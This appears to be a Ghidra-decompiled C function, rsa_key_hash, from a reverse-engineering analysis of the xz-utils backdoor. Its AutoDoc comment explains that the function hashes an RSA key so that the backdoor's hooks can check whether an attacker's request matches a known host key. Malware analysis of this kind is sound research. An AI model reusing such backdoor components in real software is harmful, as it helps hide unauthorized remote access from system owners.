// /home/kali/xzre-ghidra/xzregh/107510_rsa_key_hash.c
// Function: rsa_key_hash @ 0x107510
// Calling convention: __stdcall
// Prototype: BOOL __stdcall rsa_key_hash(RSA * rsa, u8 * mdBuf, u64 mdBufSize, imported_funcs_t * funcs)


/*
 * AutoDoc: Serialises the RSA exponent and modulus and hashes them with SHA256 using the resolved imports. The monitor hooks rely on that digest to confirm that an attacker request refers to a known host key before acting.
 */
#include "xzre_types.h"


BOOL rsa_key_hash(RSA *rsa,u8 *mdBuf,u64 mdBufSize,imported_funcs_t *funcs)

{
  u64 uVar1;
  BOOL BVar2;
  long lVar3;
  BOOL *pBVar4;
  u8 buf [4106];
  u64 written;
  u64 expSize;
  BIGNUM *n;
  u8 local_1042 [16];
  BOOL result;
  
  pBVar4 = &result;
  for (lVar3 = 0xffa; lVar3 != 0; lVar3 = lVar3 + -1) {
    *(undefined1 *)pBVar4 = FALSE;
    pBVar4 = (BOOL *)((long)pBVar4 + 1);
  }
  local_1042[0] = '\0';
  local_1042[1] = '\0';
  local_1042[2] = '\0';
  local_1042[3] = '\0';
  local_1042[4] = '\0';
  local_1042[5] = '\0';
  local_1042[6] = '\0';
  local_1042[7] = '\0';
  local_1042[8] = '\0';
  local_1042[9] = '\0';
  local_1042[10] = '\0';
  local_1042[0xb] = '\0';
  local_1042[0xc] = '\0';
  local_1042[0xd] = '\0';
  local_1042[0xe] = '\0';
  local_1042[0xf] = '\0';
  written = 0;
  if (((funcs != (imported_funcs_t *)0x0) && (rsa != (RSA *)0x0)) &&
     (funcs->RSA_get0_key != (pfn_RSA_get0_key_t)0x0)) {
    expSize = 0;
    n = (BIGNUM *)0x0;
    (*funcs->RSA_get0_key)(rsa,&n,(BIGNUM **)&expSize,(BIGNUM **)0x0);
    if ((expSize != 0) && (n != (BIGNUM *)0x0)) {
      BVar2 = bignum_serialize(local_1042,0x100a,&written,(BIGNUM *)expSize,funcs);
      uVar1 = written;
      if (((BVar2 != FALSE) &&
          ((written < 0x100a &&
           (BVar2 = bignum_serialize(local_1042 + written,0x100a - written,&written,n,funcs),
           BVar2 != FALSE)))) && (uVar1 + written < 0x100b)) {
        BVar2 = sha256(local_1042,uVar1 + written,mdBuf,mdBufSize,funcs);
        return BVar2;
      }
    }
  }
  return FALSE;
}

